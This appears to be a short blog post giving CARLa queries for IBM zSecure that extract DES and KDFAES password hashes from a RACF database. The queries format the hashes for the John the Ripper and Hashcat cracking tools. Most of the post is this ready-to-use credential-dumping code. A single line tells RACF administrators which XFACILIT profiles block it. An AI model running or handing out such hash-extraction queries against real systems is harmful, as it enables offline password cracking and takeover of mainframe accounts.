---
layout: post
title: Extracting passwords using zSecure
date: 2018-04-24 21:54 +0100
tags: RACF zSecure
---
zSecure is an excellent product that I [heartily endorse](https://www.youtube.com/watch?v=BfOmkqz06SY).  

Here is some CARLa to pull out password hashes from a RACF DB and write out the results in JohnTheRipper and/or Hashcat formats. Just delete the relevant lines to suit your needs.  

Note that this requires a RACF database to be allocated in SE.1 and will not work with a zSecure unload (since they don't contain passwords).  

**Note for RACF admins:** Define `XFACILIT` profiles of `CKG.CMD.FIELD.PASSWORD` and `CKG.CMD.FIELD.PWDX` with `UACC(NONE)` to prevent this from working.  

To extract DES hashes:  

```
newlist nopage
  select  segment=base has_password=yes
/* JtR format */
  sortlist KEY(0) | ":$racf$*" | key(0) | "*" | password(hex,0)
/* Hashcat format*/
  sortlist "$racf$*" | key(0) | "*" | password(hex,0)
```

And for KDFAES hashes:  

```
newlist nopage
  select  segment=base has_password=yes
/* JtR format */
  sortlist KEY(0) | ":$racf$*" | key(0) | "*" | password(hex,0)
/* Hashcat format*/
  sortlist "$racf$*" | key(0) | "*" | pwdx(hex,0) | ,
   password(hex,0)
```
